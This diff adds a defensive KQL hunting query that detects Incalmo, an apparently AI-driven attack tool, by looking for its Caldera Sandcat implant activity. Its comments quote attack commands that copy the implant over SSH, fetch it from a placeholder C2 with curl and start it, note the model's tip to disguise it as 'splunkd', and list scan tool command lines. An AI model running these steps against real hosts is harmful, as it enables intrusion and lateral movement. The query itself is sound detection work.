@@ -1,0 +1,45 @@
+// Incalmo's implant and commands on the hosts it attacks
+// Agentic attack detections by ThreatDefence (Incalmo). Source: https://github.com/ThreatDefence/agentic-attack-detections
+// ATT&CK: T1021.004 (Remote Services: SSH), T1570 (Lateral Tool Transfer), T1105 (Ingress Tool Transfer), T1059.004 (Command and Scripting Interpreter: Unix Shell)
+// Example hunt for Defender XDR advanced hunting. Test and baseline before alerting.
+// Incalmo runs its commands through MITRE Caldera's Sandcat implant. From its source code (reviewed at 8cd02e0e):
+//  - Spreading: scp ... sandcat.go-linux <host>:~/sandcat_tmp.go, then curl -s -m 5 -o /dev/null -w C2:%{http_code} <C2>/ and
+//    nohup ./sandcat_tmp.go -server <C2> -group red >/tmp/sc.log; or curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux"
+//    <C2>/file/download over ssh. Its model prompts suggest saving the implant as splunkd (or /tmp/splunkd).
+//  - Every command arrives as dynamic_payload_<port>_<paw>.sh, run by sh as a child of the implant.
+//  - Fixed tool command lines: nmap --max-rtt-timeout 100ms -sn ... -oX -, nmap -sV --version-light -oX -,
+//    nikto ... -Tuning 8 -maxtime 60s -timeout 3, nuclei ... -timeout 5 -severity critical -j -silent, ncat --no-shutdown -i 5s.
+// -server http and -group red are Caldera's own implant arguments too, so a Caldera exercise also matches.
+
+let Window = 30d;
+let Spread = dynamic(["sandcat_tmp.go", "C2:%{http_code}", "file:sandcat.go", "sandcat.go-linux"]);
+let Tools = DeviceProcessEvents
+    | where Timestamp > ago(Window)
+    | where (ProcessCommandLine has "--max-rtt-timeout 100ms" and ProcessCommandLine has "-oX -")
+        or ProcessCommandLine has "-sV --version-light -oX -"
+        or (ProcessCommandLine has "-Tuning 8" and ProcessCommandLine has "-maxtime 60s")
+        or (ProcessCommandLine has "-severity critical" and ProcessCommandLine has "-j -silent")
+        or ProcessCommandLine has "--no-shutdown -i 5s";
+union isfuzzy=true
+    (DeviceProcessEvents
+        | where Timestamp > ago(Window)
+        | where ProcessCommandLine has_any (Spread)
+            or (ProcessCommandLine has "-server http" and ProcessCommandLine has "-group red")
+            or (FileName =~ "splunkd" and FolderPath !has "/bin/" and ProcessCommandLine has "-server")
+        | summarize Commands=make_set(substring(ProcessCommandLine, 0, 200), 10), Timestamp=min(Timestamp) by DeviceName, AccountName
+        | project Timestamp, DeviceName, AccountName, Signal="Sandcat implant copied, pulled or started the way Incalmo does it", Detail=tostring(Commands)),
+    (DeviceProcessEvents
+        | where Timestamp > ago(Window)
+        | where ProcessCommandLine has "dynamic_payload_" or InitiatingProcessCommandLine has "dynamic_payload_"
+        | summarize Commands=make_set(substring(ProcessCommandLine, 0, 200), 15), Timestamp=min(Timestamp) by DeviceName, AccountName
+        | project Timestamp, DeviceName, AccountName, Signal="Incalmo per-command script and what it ran", Detail=tostring(Commands)),
+    (Tools
+        | summarize Commands=make_set(substring(ProcessCommandLine, 0, 200), 10), Timestamp=min(Timestamp) by DeviceName, AccountName
+        | project Timestamp, DeviceName, AccountName, Signal="Incalmo scan command lines", Detail=tostring(Commands)),
+    (DeviceFileEvents
+        | where Timestamp > ago(Window)
+        | where FileName in~ ("sandcat_tmp.go", "kill_agent.sh") or FileName startswith "dynamic_payload_" or FolderPath endswith "/tmp/sc.log"
+            or (FileName =~ "splunkd" and FolderPath !has "/bin/")
+        | summarize Files=make_set(FolderPath, 10), Timestamp=min(Timestamp) by DeviceName
+        | project Timestamp, DeviceName, AccountName="", Signal="Incalmo implant, implant log or per-command script on disk", Detail=tostring(Files))
+| order by Timestamp desc
